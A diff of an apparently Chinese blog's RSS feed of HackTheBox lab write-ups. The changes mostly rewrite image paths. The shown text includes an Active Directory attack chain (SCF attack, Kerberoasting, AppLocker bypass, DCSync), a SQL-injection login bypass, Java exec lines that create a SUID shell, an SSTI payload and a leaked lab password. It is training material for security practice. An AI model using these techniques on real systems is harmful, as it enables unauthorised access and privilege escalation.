+&lt;p&gt;再交完用户和系统标志后来理一下这个靶机的流程&lt;/p&gt;
+&lt;p&gt;扫到匿名smb共享目录，发写可写的俩个文件夹，同时存在交互（删除文件）满足SCF文件攻击的特性&amp;ndash;&amp;gt;拿到初始用户&amp;ndash;&amp;gt;发现用户密码能够用在搓证书的网页搓证书得以登陆evil-winrm&amp;ndash;&amp;gt;bloodhound-python得知mrlky用户有SPN标志，满足Kerberoasting攻击&amp;ndash;&amp;gt;impacket攻击不作用使用Rubeus攻击，但是发现power shell受限&amp;ndash;&amp;gt;利用PSByPassCLM突破限制&amp;ndash;&amp;gt;后又存在AppLocker限制将文件放在特殊的文件夹下得以破解&amp;ndash;&amp;gt;使用rubeus.exe拿到mrlky的hash&amp;ndash;&amp;gt;拿到账户密码发动DCSync攻击&lt;/p&gt;
+</description>
+        </item>
+        <item>
         <title>Resolute</title>
         <link>https://nergigantes.github.io/htb/resolute/</link>
         <pubDate>Sat, 29 Mar 2025 13:36:57 +0800</pubDate>
         
         <guid>https://nergigantes.github.io/htb/resolute/</guid>
-        <description>&lt;img src="https://nergigantes.github.io/htb/resolute/10.jpg" alt="Featured image of post Resolute" /&gt;&lt;h1 id=&#34;速通教程&#34;&gt;速通教程：
+        <description>&lt;img src="https://nergigantes.github.io/10.jpg" alt="Featured image of post Resolute" /&gt;&lt;h1 id=&#34;速通教程&#34;&gt;速通教程：
 &lt;/h1&gt;&lt;p&gt;使用netexec扫一下漏洞&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
 &lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
@@ -207,7 +556,7 @@
         <pubDate>Sat, 29 Mar 2025 13:36:53 +0800</pubDate>
         
         <guid>https://nergigantes.github.io/htb/blackfield/</guid>
-        <description>&lt;img src="https://nergigantes.github.io/htb/blackfield/19.jpg" alt="Featured image of post Blackfield" /&gt;&lt;p&gt;扫一下端口&lt;/p&gt;
+        <description>&lt;img src="https://nergigantes.github.io/19.jpg" alt="Featured image of post Blackfield" /&gt;&lt;p&gt;扫一下端口&lt;/p&gt;
 &lt;p&gt;&lt;img src=&#34;https://nergigantes.github.io/htb/blackfield/1742784922578-e573fa60-eb3d-4381-b080-4edb2318aaf0.png&#34;
 	width=&#34;1178&#34;
 	height=&#34;799&#34;
@@ -525,7 +874,7 @@
         <pubDate>Sat, 22 Mar 2025 19:05:53 +0800</pubDate>
         
         <guid>https://nergigantes.github.io/htb/sauna/</guid>
-        <description>&lt;img src="https://nergigantes.github.io/htb/sauna/3.jpg" alt="Featured image of post Sauna" /&gt;&lt;p&gt;扫端口&lt;/p&gt;
+        <description>&lt;img src="https://nergigantes.github.io/3.jpg" alt="Featured image of post Sauna" /&gt;&lt;p&gt;扫端口&lt;/p&gt;
 &lt;p&gt;&lt;img src=&#34;https://nergigantes.github.io/htb/sauna/1742544068788-0b5e774d-9fad-43df-8798-bb6646c2111e.png&#34;
 	width=&#34;1168&#34;
 	height=&#34;821&#34;
@@ -668,7 +1017,7 @@ DefaultPassword               :  Moneymakestheworldgoround!
         <pubDate>Sat, 22 Mar 2025 19:05:52 +0800</pubDate>
         
         <guid>https://nergigantes.github.io/htb/active/</guid>
-        <description>&lt;img src="https://nergigantes.github.io/htb/active/1.jpg" alt="Featured image of post Active" /&gt;&lt;p&gt;端口信息：&lt;/p&gt;
+        <description>&lt;img src="https://nergigantes.github.io/1.jpg" alt="Featured image of post Active" /&gt;&lt;p&gt;端口信息：&lt;/p&gt;
 &lt;p&gt;&lt;img src=&#34;https://nergigantes.github.io/htb/active/1742632854854-be7899f7-4d73-4344-a0d4-b150209812c6.png&#34;
 	width=&#34;1300&#34;
 	height=&#34;1111&#34;
@@ -751,7 +1100,7 @@ DefaultPassword               :  Moneymakestheworldgoround!
         <pubDate>Sat, 22 Mar 2025 19:00:49 +0800</pubDate>
         
         <guid>https://nergigantes.github.io/htb/forest/</guid>
-        <description>&lt;img src="https://nergigantes.github.io/htb/forest/27.jpg" alt="Featured image of post Forest" /&gt;&lt;p&gt;扫端口&lt;/p&gt;
+        <description>&lt;img src="https://nergigantes.github.io/27.jpg" alt="Featured image of post Forest" /&gt;&lt;p&gt;扫端口&lt;/p&gt;
 &lt;p&gt;nmap -sCV -A 10.10.10.161&lt;/p&gt;
 &lt;p&gt;&lt;img src=&#34;https://nergigantes.github.io/htb/forest/1742439388416-045b031c-7131-4cb7-93ff-25530f74c781.png&#34;
 	width=&#34;1343&#34;
@@ -1041,7 +1390,7 @@ Message signing enabled and required：这表示消息签名已启用并且是�
         <pubDate>Wed, 19 Mar 2025 21:27:22 +0800</pubDate>
         
         <guid>https://nergigantes.github.io/htb/thenotebookdocker-%E9%80%83%E9%80%B8/</guid>
-        <description>&lt;img src="https://nergigantes.github.io/htb/thenotebookdocker-%E9%80%83%E9%80%B8/21.jpg" alt="Featured image of post TheNotebook(Docker 逃逸)" /&gt;&lt;h2 id=&#34;外网打点&#34;&gt;外网打点
+        <description>&lt;img src="https://nergigantes.github.io/21.jpg" alt="Featured image of post TheNotebook(Docker 逃逸)" /&gt;&lt;h2 id=&#34;外网打点&#34;&gt;外网打点
 &lt;/h2&gt;&lt;p&gt;三板斧&lt;/p&gt;
 &lt;p&gt;扫端口，目录，域名&lt;/p&gt;
 &lt;p&gt;&lt;img src=&#34;https://nergigantes.github.io/htb/thenotebookdocker-%E9%80%83%E9%80%B8/1742382513237-4fb7ed7b-6ead-4dca-b7ea-145d637c0d5c.png&#34;
@@ -1182,7 +1531,7 @@ Message signing enabled and required：这表示消息签名已启用并且是�
         <pubDate>Wed, 19 Mar 2025 16:38:29 +0800</pubDate>
         
         <guid>https://nergigantes.github.io/htb/tabby/</guid>
-        <description>&lt;img src="https://nergigantes.github.io/htb/tabby/26.jpg" alt="Featured image of post Tabby" /&gt;&lt;h1 id=&#34;寻找立足点&#34;&gt;寻找立足点
+        <description>&lt;img src="https://nergigantes.github.io/26.jpg" alt="Featured image of post Tabby" /&gt;&lt;h1 id=&#34;寻找立足点&#34;&gt;寻找立足点
 &lt;/h1&gt;&lt;p&gt;扫描端口22,80,8080,有子域名子域名扫描无发现，目录爆破无发现&lt;/p&gt;
 &lt;p&gt;在一个页面的url看着像文件包含&lt;/p&gt;
 &lt;p&gt;&lt;img src=&#34;https://nergigantes.github.io/htb/tabby/1727763206443-d8297e7d-e7f2-491e-a529-4cdbc92be711.png&#34;
@@ -1284,7 +1633,7 @@ Message signing enabled and required：这表示消息签名已启用并且是�
         <pubDate>Wed, 19 Mar 2025 16:38:29 +0800</pubDate>
         
         <guid>https://nergigantes.github.io/htb/traceback/</guid>
-        <description>&lt;img src="https://nergigantes.github.io/htb/traceback/3.jpg" alt="Featured image of post TraceBack" /&gt;&lt;h1 id=&#34;寻找立足点&#34;&gt;寻找立足点
+        <description>&lt;img src="https://nergigantes.github.io/3.jpg" alt="Featured image of post TraceBack" /&gt;&lt;h1 id=&#34;寻找立足点&#34;&gt;寻找立足点
 &lt;/h1&gt;&lt;p&gt;扫描端口，22和80打开网页提示我们说这个网站已经被写入了后门，在互联网上搜索留下的痕迹Xh4H&lt;/p&gt;
 &lt;p&gt;发现后门地址&lt;a class=&#34;link&#34; href=&#34;https://github.com/Xh4H/Web-Shells/blob/master/smevk.php&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
     &gt;smevk.php&lt;/a&gt;，账号密码为admin:admin&lt;/p&gt;
@@ -1302,7 +1651,7 @@ Message signing enabled and required：这表示消息签名已启用并且是�
         <pubDate>Wed, 19 Mar 2025 16:38:29 +0800</pubDate>
         
         <guid>https://nergigantes.github.io/htb/traverxec/</guid>
-        <description>&lt;img src="https://nergigantes.github.io/htb/traverxec/1.jpg" alt="Featured image of post Traverxec" /&gt;&lt;h1 id=&#34;寻找立足点&#34;&gt;寻找立足点
+        <description>&lt;img src="https://nergigantes.github.io/1.jpg" alt="Featured image of post Traverxec" /&gt;&lt;h1 id=&#34;寻找立足点&#34;&gt;寻找立足点
 &lt;/h1&gt;&lt;p&gt;namp扫描端口，得知80端口的服务器为Nostromo 1.9.6&lt;/p&gt;
 &lt;p&gt;搜索发现有poc&lt;/p&gt;
 &lt;p&gt;使用msfconsole框架拿到shell&lt;/p&gt;
@@ -1431,7 +1780,7 @@ Message signing enabled and required：这表示消息签名已启用并且是�
         <pubDate>Wed, 19 Mar 2025 16:38:29 +0800</pubDate>
         
         <guid>https://nergigantes.github.io/htb/usage/</guid>
-        <description>&lt;img src="https://nergigantes.github.io/htb/usage/26.jpg" alt="Featured image of post Usage" /&gt;&lt;h1 id=&#34;寻找立足点&#34;&gt;寻找立足点
+        <description>&lt;img src="https://nergigantes.github.io/26.jpg" alt="Featured image of post Usage" /&gt;&lt;h1 id=&#34;寻找立足点&#34;&gt;寻找立足点
 &lt;/h1&gt;&lt;p&gt;扫描端口，22,80打开网页，注册个账号，在重置密码处存在sql注入&lt;/p&gt;
 &lt;p&gt;bp抓包用sqlmap跑&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
@@ -1529,7 +1878,7 @@ Message signing enabled and required：这表示消息签名已启用并且是�
         <pubDate>Wed, 19 Mar 2025 16:38:29 +0800</pubDate>
         
         <guid>https://nergigantes.github.io/htb/valentine/</guid>
-        <description>&lt;img src="https://nergigantes.github.io/htb/valentine/20.jpg" alt="Featured image of post Valentine" /&gt;&lt;h1 id=&#34;寻找立足点&#34;&gt;寻找立足点
+        <description>&lt;img src="https://nergigantes.github.io/20.jpg" alt="Featured image of post Valentine" /&gt;&lt;h1 id=&#34;寻找立足点&#34;&gt;寻找立足点
 &lt;/h1&gt;&lt;p&gt;扫描端口22,80,443&lt;/p&gt;
 &lt;p&gt;网页打开只有一张图片，目录扫描有个dev目录里面有个hype_key文件，16进制换字符串看到是个rsa私钥，john破解不了&lt;/p&gt;
 &lt;p&gt;这时再用namp扫描漏洞查看受到&lt;font style=&#34;color:rgb(36, 36, 36);&#34;&gt;Heartbleed Bug&lt;/font&gt;&lt;/p&gt;
@@ -1563,7 +1912,7 @@ Message signing enabled and required：这表示消息签名已启用并且是�
         <pubDate>Wed, 19 Mar 2025 16:38:29 +0800</pubDate>
         
         <guid>https://nergigantes.github.io/htb/vault%E5%86%85%E7%BD%91%E6%9C%AA%E5%AE%8C/</guid>
-        <description>&lt;img src="https://nergigantes.github.io/htb/vault%E5%86%85%E7%BD%91%E6%9C%AA%E5%AE%8C/6.jpg" alt="Featured image of post Vault（内网未完）" /&gt;&lt;h2 id=&#34;外网打点&#34;&gt;外网打点
+        <description>&lt;img src="https://nergigantes.github.io/6.jpg" alt="Featured image of post Vault（内网未完）" /&gt;&lt;h2 id=&#34;外网打点&#34;&gt;外网打点
 &lt;/h2&gt;&lt;p&gt;三件套安排&lt;/p&gt;
 &lt;p&gt;扫端口，扫目录，扫子域名（有域名的话）&lt;/p&gt;
 &lt;p&gt;直接扫的话开始没有东西，百思不得其解看wp说要注意给的信息&lt;/p&gt;
@@ -1606,7 +1955,7 @@ Message signing enabled and required：这表示消息签名已启用并且是�
         <pubDate>Wed, 19 Mar 2025 16:38:29 +0800</pubDate>
         
         <guid>https://nergigantes.github.io/htb/writeup/</guid>
-        <description>&lt;img src="https://nergigantes.github.io/htb/writeup/22.jpg" alt="Featured image of post Writeup" /&gt;&lt;p&gt;端口，域名，无发现&lt;/p&gt;
+        <description>&lt;img src="https://nergigantes.github.io/22.jpg" alt="Featured image of post Writeup" /&gt;&lt;p&gt;端口，域名，无发现&lt;/p&gt;
 &lt;p&gt;该网站有防Dos功能，目录爆破用不了&lt;/p&gt;
 &lt;p&gt;robots.txt提示了有个writeup&lt;/p&gt;
 &lt;p&gt;打开这个页面底部下提示了由&lt;/p&gt;
@@ -1667,7 +2016,7 @@ Message signing enabled and required：这表示消息签名已启用并且是�
         <pubDate>Wed, 19 Mar 2025 16:38:28 +0800</pubDate>
         
         <guid>https://nergigantes.github.io/htb/magic/</guid>
-        <description>&lt;img src="https://nergigantes.github.io/htb/magic/1.jpg" alt="Featured image of post Magic" /&gt;&lt;h2 id=&#34;寻找立足点&#34;&gt;寻找立足点
+        <description>&lt;img src="https://nergigantes.github.io/1.jpg" alt="Featured image of post Magic" /&gt;&lt;h2 id=&#34;寻找立足点&#34;&gt;寻找立足点
 &lt;/h2&gt;&lt;p&gt;打开网页能看到一个登录接口&lt;/p&gt;
 &lt;p&gt;试一下万能密码admin&amp;rsquo; or &amp;lsquo;1&amp;rsquo;=&amp;lsquo;1&lt;/p&gt;
 &lt;p&gt;进去了然后是一个上传接口&lt;/p&gt;
@@ -1717,7 +2066,7 @@ Message signing enabled and required：这表示消息签名已启用并且是�
         <pubDate>Wed, 19 Mar 2025 16:38:28 +0800</pubDate>
         
         <guid>https://nergigantes.github.io/htb/mango/</guid>
-        <description>&lt;img src="https://nergigantes.github.io/htb/mango/9.jpg" alt="Featured image of post Mango" /&gt;&lt;p&gt;Java.type(&amp;lsquo;java.lang.Runtime&amp;rsquo;).getRuntime().exec(&amp;lsquo;cp /bin/sh /tmp/sh&amp;rsquo;).waitFor()&lt;/p&gt;
+        <description>&lt;img src="https://nergigantes.github.io/9.jpg" alt="Featured image of post Mango" /&gt;&lt;p&gt;Java.type(&amp;lsquo;java.lang.Runtime&amp;rsquo;).getRuntime().exec(&amp;lsquo;cp /bin/sh /tmp/sh&amp;rsquo;).waitFor()&lt;/p&gt;
 &lt;p&gt;Java.type(&amp;lsquo;java.lang.Runtime&amp;rsquo;).getRuntime().exec(&amp;lsquo;chmod u+s /tmp/sh&amp;rsquo;).waitFor()&lt;/p&gt;
 </description>
         </item>
@@ -1727,7 +2076,7 @@ Message signing enabled and required：这表示消息签名已启用并且是�
         <pubDate>Wed, 19 Mar 2025 16:38:28 +0800</pubDate>
         
         <guid>https://nergigantes.github.io/htb/metatwo/</guid>
-        <description>&lt;img src="https://nergigantes.github.io/htb/metatwo/27.jpg" alt="Featured image of post MetaTwo" /&gt;&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;https://blog.csdn.net/qq_45894840/article/details/127748459&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+        <description>&lt;img src="https://nergigantes.github.io/27.jpg" alt="Featured image of post MetaTwo" /&gt;&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;https://blog.csdn.net/qq_45894840/article/details/127748459&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
     &gt;HackTheBox MetaTwo 网站框架CVE获取用户shell和破解私钥提权_gpg2john-CSDN博客&lt;/a&gt;&lt;/p&gt;
 </description>
         </item>
@@ -1737,7 +2086,7 @@ Message signing enabled and required：这表示消息签名已启用并且是�
         <pubDate>Wed, 19 Mar 2025 16:38:28 +0800</pubDate>
         
         <guid>https://nergigantes.github.io/htb/mirai/</guid>
-        <description>&lt;img src="https://nergigantes.github.io/htb/mirai/25.jpg" alt="Featured image of post Mirai" /&gt;&lt;h1 id=&#34;寻找立足点&#34;&gt;寻找立足点
+        <description>&lt;img src="https://nergigantes.github.io/25.jpg" alt="Featured image of post Mirai" /&gt;&lt;h1 id=&#34;寻找立足点&#34;&gt;寻找立足点
 &lt;/h1&gt;&lt;p&gt;扫描端口，22，53，80&lt;/p&gt;
 &lt;p&gt;80打开空白网页，目录扫到admin，发现是Pi-hole Version v3.1.4&lt;/p&gt;
 &lt;p&gt;&lt;img src=&#34;https://nergigantes.github.io/htb/mirai/1726209856436-6f379015-23a5-483e-b254-85dcbcda9ead.png&#34;
@@ -1878,7 +2227,7 @@ Message signing enabled and required：这表示消息签名已启用并且是�
         <pubDate>Wed, 19 Mar 2025 16:38:28 +0800</pubDate>
         
         <guid>https://nergigantes.github.io/htb/monitorstwo/</guid>
-        <description>&lt;img src="https://nergigantes.github.io/htb/monitorstwo/10.jpg" alt="Featured image of post MonitorsTwo" /&gt;&lt;h1 id=&#34;寻找立足点&#34;&gt;寻找立足点
+        <description>&lt;img src="https://nergigantes.github.io/10.jpg" alt="Featured image of post MonitorsTwo" /&gt;&lt;h1 id=&#34;寻找立足点&#34;&gt;寻找立足点
 &lt;/h1&gt;&lt;p&gt;扫端口无发现，无域名，目录扫描&lt;/p&gt;
 &lt;p&gt;网页打开，得知是&lt;font style=&#34;color:rgb(36, 36, 36);&#34;&gt;cacti 1.2.22&lt;/font&gt;&lt;/p&gt;
 &lt;p&gt;&lt;font style=&#34;color:rgb(36, 36, 36);&#34;&gt;用poc拿到shell&lt;/font&gt;&lt;/p&gt;
@@ -1935,7 +2284,7 @@ Message signing enabled and required：这表示消息签名已启用并且是�
         <pubDate>Wed, 19 Mar 2025 16:38:28 +0800</pubDate>
         
         <guid>https://nergigantes.github.io/htb/nibbles/</guid>
-        <description>&lt;img src="https://nergigantes.github.io/htb/nibbles/4.jpg" alt="Featured image of post Nibbles" /&gt;&lt;h1 id=&#34;寻找立足点&#34;&gt;寻找立足点
+        <description>&lt;img src="https://nergigantes.github.io/4.jpg" alt="Featured image of post Nibbles" /&gt;&lt;h1 id=&#34;寻找立足点&#34;&gt;寻找立足点
 &lt;/h1&gt;&lt;p&gt;扫描端口，只开了80&lt;/p&gt;
 &lt;p&gt;网页打开提示一个目录/nibbleblog进去后是个博客&lt;/p&gt;
 &lt;p&gt;扫目录扫到一个后台管理，admin.php&lt;/p&gt;
@@ -1984,7 +2333,7 @@ Message signing enabled and required：这表示消息签名已启用并且是�
         <pubDate>Wed, 19 Mar 2025 16:38:28 +0800</pubDate>
         
         <guid>https://nergigantes.github.io/htb/nineveh/</guid>
-        <description>&lt;img src="https://nergigantes.github.io/htb/nineveh/10.jpg" alt="Featured image of post Nineveh" /&gt;&lt;p&gt;学到了使用hydra爆破密码，&lt;/p&gt;
+        <description>&lt;img src="https://nergigantes.github.io/10.jpg" alt="Featured image of post Nineveh" /&gt;&lt;p&gt;学到了使用hydra爆破密码，&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
 &lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
 &lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
@@ -2065,7 +2414,7 @@ Message signing enabled and required：这表示消息签名已启用并且是�
         <pubDate>Wed, 19 Mar 2025 16:38:28 +0800</pubDate>
         
         <guid>https://nergigantes.github.io/htb/obscurity/</guid>
-        <description>&lt;img src="https://nergigantes.github.io/htb/obscurity/3.jpg" alt="Featured image of post Obscurity" /&gt;&lt;p&gt;fuzz爆出develop目录看源码&lt;/p&gt;
+        <description>&lt;img src="https://nergigantes.github.io/3.jpg" alt="Featured image of post Obscurity" /&gt;&lt;p&gt;fuzz爆出develop目录看源码&lt;/p&gt;
 &lt;p&gt;分析源码利用exec语句构造playload&lt;/p&gt;
 &lt;p&gt;提权时查看rebor用户目录下的py文件&lt;/p&gt;
 &lt;p&gt;提权root时&lt;/p&gt;
@@ -2086,7 +2435,7 @@ Message signing enabled and required：这表示消息签名已启用并且是�
         <pubDate>Wed, 19 Mar 2025 16:38:28 +0800</pubDate>
         
         <guid>https://nergigantes.github.io/htb/openadmin/</guid>
-        <description>&lt;img src="https://nergigantes.github.io/htb/openadmin/26.jpg" alt="Featured image of post OpenAdmin" /&gt;&lt;h1 id=&#34;寻找立足点&#34;&gt;寻找立足点
+        <description>&lt;img src="https://nergigantes.github.io/26.jpg" alt="Featured image of post OpenAdmin" /&gt;&lt;h1 id=&#34;寻找立足点&#34;&gt;寻找立足点
 &lt;/h1&gt;&lt;p&gt;扫描端口22,80&lt;/p&gt;
 &lt;p&gt;打开网页没有东西，dirsearch,gobuster扫到/ona，一个后台管理网站&lt;/p&gt;
 &lt;p&gt;直接给了版本18.1.1网上搜索poc&lt;/p&gt;
@@ -2198,7 +2547,7 @@ Message signing enabled and required：这表示消息签名已启用并且是�
         <pubDate>Wed, 19 Mar 2025 16:38:28 +0800</pubDate>
         
         <guid>https://nergigantes.github.io/htb/paper/</guid>
-        <description>&lt;img src="https://nergigantes.github.io/htb/paper/4.jpg" alt="Featured image of post Paper" /&gt;&lt;h1 id=&#34;寻找立足点&#34;&gt;寻找立足点
+        <description>&lt;img src="https://nergigantes.github.io/4.jpg" alt="Featured image of post Paper" /&gt;&lt;h1 id=&#34;寻找立足点&#34;&gt;寻找立足点
 &lt;/h1&gt;&lt;p&gt;扫描端口22,80,443&lt;/p&gt;
 &lt;p&gt;80，443打开发现是个appech&lt;/p&gt;
 &lt;p&gt;查看网页字段头发现主机名&lt;/p&gt;
@@ -2261,7 +2610,7 @@ Message signing enabled and required：这表示消息签名已启用并且是�
         <pubDate>Wed, 19 Mar 2025 16:38:28 +0800</pubDate>
         
         <guid>https://nergigantes.github.io/htb/passage/</guid>
-        <description>&lt;img src="https://nergigantes.github.io/htb/passage/7.jpg" alt="Featured image of post Passage" /&gt;&lt;p&gt;网页模板为CuteNews2.1.2&lt;/p&gt;
+        <description>&lt;img src="https://nergigantes.github.io/7.jpg" alt="Featured image of post Passage" /&gt;&lt;p&gt;网页模板为CuteNews2.1.2&lt;/p&gt;
 &lt;p&gt;有poc&lt;/p&gt;
 &lt;p&gt;使用进入弹shell&lt;/p&gt;
 &lt;p&gt;然后linpeash.sh扫到适合pwnkit&lt;/p&gt;
@@ -2274,7 +2623,7 @@ Message signing enabled and required：这表示消息签名已启用并且是�
         <pubDate>Wed, 19 Mar 2025 16:38:28 +0800</pubDate>
         
         <guid>https://nergigantes.github.io/htb/pc/</guid>
-        <description>&lt;img src="https://nergigantes.github.io/htb/pc/22.jpg" alt="Featured image of post PC" /&gt;&lt;p&gt;扫端口到50002&lt;/p&gt;
+        <description>&lt;img src="https://nergigantes.github.io/22.jpg" alt="Featured image of post PC" /&gt;&lt;p&gt;扫端口到50002&lt;/p&gt;
 &lt;p&gt;弱口令登录拿到token&lt;/p&gt;
 &lt;p&gt;id注入sqlmap拿到ssh账号密码&lt;/p&gt;
 &lt;p&gt;之后root提权有点懵&lt;/p&gt;
@@ -2288,7 +2637,7 @@ Message signing enabled and required：这表示消息签名已启用并且是�
         <pubDate>Wed, 19 Mar 2025 16:38:28 +0800</pubDate>
         
         <guid>https://nergigantes.github.io/htb/perfection/</guid>
-        <description>&lt;img src="https://nergigantes.github.io/htb/perfection/22.jpg" alt="Featured image of post perfection" /&gt;&lt;h1 id=&#34;寻找立足点&#34;&gt;寻找立足点
+        <description>&lt;img src="https://nergigantes.github.io/22.jpg" alt="Featured image of post perfection" /&gt;&lt;h1 id=&#34;寻找立足点&#34;&gt;寻找立足点
 &lt;/h1&gt;&lt;p&gt;拿到网站扫描端口，在浏览器打开发现底部有提示&lt;font style=&#34;color:rgb(77, 77, 77);&#34;&gt;WEBrick1.7.0，寻找该版本漏洞未果后发现是ruby语言（&lt;/font&gt;&lt;strong&gt;&lt;font style=&#34;color:rgb(77, 77, 77);&#34;&gt;Wappalyzer扩展收集信息&lt;/font&gt;&lt;/strong&gt;&lt;font style=&#34;color:rgb(77, 77, 77);&#34;&gt;）&lt;/font&gt;&lt;/p&gt;
 &lt;p&gt;&lt;font style=&#34;color:rgb(77, 77, 77);&#34;&gt;了解到ruby语言与python语言用高级语言搭建的服务器通常有模板，衍生想到模板注入SSTI&lt;/font&gt;&lt;/p&gt;
 &lt;p&gt;&lt;font style=&#34;color:rgb(77, 77, 77);&#34;&gt;在全网站为一有参数的地方试出playpoad=a%0A&amp;lt;%25+命令+%25&amp;gt;&lt;/font&gt;&lt;/p&gt;
@@ -2354,7 +2703,7 @@ Message signing enabled and required：这表示消息签名已启用并且是�
         <pubDate>Wed, 19 Mar 2025 16:38:28 +0800</pubDate>
         
         <guid>https://nergigantes.github.io/htb/photobomb/</guid>
-        <description>&lt;img src="https://nergigantes.github.io/htb/photobomb/12.jpg" alt="Featured image of post Photobomb" /&gt;&lt;h1 id=&#34;寻找立足点&#34;&gt;寻找立足点
+        <description>&lt;img src="https://nergigantes.github.io/12.jpg" alt="Featured image of post Photobomb" /&gt;&lt;h1 id=&#34;寻找立足点&#34;&gt;寻找立足点
 &lt;/h1&gt;&lt;p&gt;扫端口正常，有域名爆子域名无发现，目录扫描没发现&lt;/p&gt;
 &lt;p&gt;打开网页看到一个路径/print&lt;/p&gt;
 &lt;p&gt;要验证，是Basic验证，准备爆破密码，但是在源码上看到一个js文件，点进去看见一个&lt;/p&gt;
@@ -2456,7 +2805,7 @@ Message signing enabled and required：这表示消息签名已启用并且是�
         <pubDate>Wed, 19 Mar 2025 16:38:28 +0800</pubDate>
         
         <guid>https://nergigantes.github.io/htb/pilgrimage/</guid>
-        <description>&lt;img src="https://nergigantes.github.io/htb/pilgrimage/5.jpg" alt="Featured image of post Pilgrimage" /&gt;&lt;h1 id=&#34;寻找立足点&#34;&gt;寻找立足点
+        <description>&lt;img src="https://nergigantes.github.io/5.jpg" alt="Featured image of post Pilgrimage" /&gt;&lt;h1 id=&#34;寻找立足点&#34;&gt;寻找立足点
 &lt;/h1&gt;&lt;p&gt;拿到ip扫端口，网页打开有域名扫子域名，然后目录爆破没有发现&lt;/p&gt;
 &lt;p&gt;nmap扫到80端口有/.git库但是我们网页打不开，借用工具git-dumper&lt;/p&gt;
 &lt;p&gt;下载下来查看到源码&lt;/p&gt;
@@ -2536,7 +2885,7 @@ Message signing enabled and required：这表示消息签名已启用并且是�
         <pubDate>Wed, 19 Mar 2025 16:38:28 +0800</pubDate>
         
         <guid>https://nergigantes.github.io/htb/popcorn/</guid>
-        <description>&lt;img src="https://nergigantes.github.io/htb/popcorn/26.jpg" alt="Featured image of post Popcorn" /&gt;&lt;p&gt;有域名但扫不到子域名，目录爆出来个&lt;a class=&#34;link&#34; href=&#34;http://10.10.10.6/torrent/torrents.php?mode=upload&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+        <description>&lt;img src="https://nergigantes.github.io/26.jpg" alt="Featured image of post Popcorn" /&gt;&lt;p&gt;有域名但扫不到子域名，目录爆出来个&lt;a class=&#34;link&#34; href=&#34;http://10.10.10.6/torrent/torrents.php?mode=upload&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
     &gt;torrent&lt;/a&gt;目录&lt;/p&gt;
 &lt;p&gt;这个网站可以上传一个正确的bt种子，然后可以编辑种子的‘头像’&lt;/p&gt;
 &lt;p&gt;将文件类型改为image/png&lt;/p&gt;
@@ -2553,7 +2902,7 @@ Message signing enabled and required：这表示消息签名已启用并且是�
         <pubDate>Wed, 19 Mar 2025 16:38:28 +0800</pubDate>
         
         <guid>https://nergigantes.github.io/htb/postman/</guid>
-        <description>&lt;img src="https://nergigantes.github.io/htb/postman/9.jpg" alt="Featured image of post Postman" /&gt;&lt;p&gt;寻找立足点&lt;/p&gt;
+        <description>&lt;img src="https://nergigantes.github.io/9.jpg" alt="Featured image of post Postman" /&gt;&lt;p&gt;寻找立足点&lt;/p&gt;
 &lt;p&gt;扫描端有俩个不正常的&lt;/p&gt;
 &lt;p&gt;10000,6379&lt;/p&gt;
 &lt;p&gt;先看10000是个https网页，是一个cms登录，常用的密码无效，查看6379端口&lt;/p&gt;
@@ -2615,7 +2964,7 @@ Message signing enabled and required：这表示消息签名已启用并且是�
         <pubDate>Wed, 19 Mar 2025 16:38:28 +0800</pubDate>
         
         <guid>https://nergigantes.github.io/htb/precious/</guid>
-        <description>&lt;img src="https://nergigantes.github.io/htb/precious/24.jpg" alt="Featured image of post Precious" /&gt;&lt;h1 id=&#34;寻找立足点&#34;&gt;寻找立足点
+        <description>&lt;img src="https://nergigantes.github.io/24.jpg" alt="Featured image of post Precious" /&gt;&lt;h1 id=&#34;寻找立足点&#34;&gt;寻找立足点
 &lt;/h1&gt;&lt;p&gt;扫描端口无发现，打开网站使用插件得知该网站使用的是&lt;strong&gt;Phusion Passenger&lt;/strong&gt;（网络服务器）&lt;/p&gt;
 &lt;p&gt;经探测输入一个可访问的网站会提供给我一个快照，下载该图片分析&lt;/p&gt;
 &lt;p&gt;使用&lt;font style=&#34;color:rgb(36, 36, 36);background-color:rgb(242, 242, 242);&#34;&gt;exiftool&lt;/font&gt;&lt;font style=&#34;color:rgb(36, 36, 36);&#34;&gt;工具进行分析&lt;/font&gt;&lt;/p&gt;
@@ -2657,7 +3006,7 @@ Message signing enabled and required：这表示消息签名已启用并且是�
         <pubDate>Wed, 19 Mar 2025 16:38:28 +0800</pubDate>
         
         <guid>https://nergigantes.github.io/htb/previse/</guid>
-        <description>&lt;img src="https://nergigantes.github.io/htb/previse/14.jpg" alt="Featured image of post Previse" /&gt;&lt;h1 id=&#34;寻找立足点&#34;&gt;寻找立足点
+        <description>&lt;img src="https://nergigantes.github.io/14.jpg" alt="Featured image of post Previse" /&gt;&lt;h1 id=&#34;寻找立足点&#34;&gt;寻找立足点
 &lt;/h1&gt;&lt;p&gt;扫描端口正常，打开网页是个登录的页面，由php编写&lt;/p&gt;
 &lt;p&gt;尝试各种密码无反应&lt;/p&gt;
 &lt;p&gt;目录扫描时发现许多php页面都被重定向到了login.php的页面，并且重定向之前和之后的文件大小不一致&lt;/p&gt;
@@ -2752,7 +3101,7 @@ Message signing enabled and required：这表示消息签名已启用并且是�
         <pubDate>Wed, 19 Mar 2025 16:38:28 +0800</pubDate>
         
         <guid>https://nergigantes.github.io/htb/redpanda/</guid>
-        <description>&lt;img src="https://nergigantes.github.io/htb/redpanda/22.jpg" alt="Featured image of post RedPanda" /&gt;&lt;p&gt;网站打开，搜索功能&lt;/p&gt;
